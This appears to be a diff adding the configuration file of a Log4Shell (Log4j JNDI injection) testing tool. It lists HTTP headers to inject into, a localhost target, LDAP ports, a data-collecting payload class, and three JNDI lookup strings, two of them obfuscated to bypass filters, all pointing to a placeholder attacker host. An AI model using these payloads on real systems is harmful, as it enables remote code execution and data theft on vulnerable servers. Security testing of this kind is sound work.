@@ -1,0 +1,30 @@
+HTTP_HEADERS = (
+    'Accept-Language',
+    'User-Agent',
+    'X-Forwarded-For',
+    'X-Forwarded-Host',
+    'X-Requested-With',
+)
+
+TARGETS = (
+    'http://127.0.0.1:8080/endpoint',
+)
+
+JNDI_PORTS = (
+    1389,
+    8443,
+)
+
+BYPASSES = (
+    # NOTE: %%_VARIABLE_NAME convention due to clashes in string formatting
+    'jndi:ldap://%%ATTACKER_HOST:%%JNDI_PORT',
+    '${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%%ATTACKER_HOST:%%JNDI_PORT}',
+    '${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//%%ATTACKER_HOST:%%JNDI_PORT',
+)
+
+ATTACKER_HOST = '127.0.0.1'
+ATTACKER_PORT = 8889
+COLLECTOR_PORT = 8888
+
+PAYLOAD_CLS = 'payloads.generic.collect.Payload'
+COMPILER_JAVAC = '/usr/local/Cellar/openjdk@8/1.8.0+312/bin/javac'
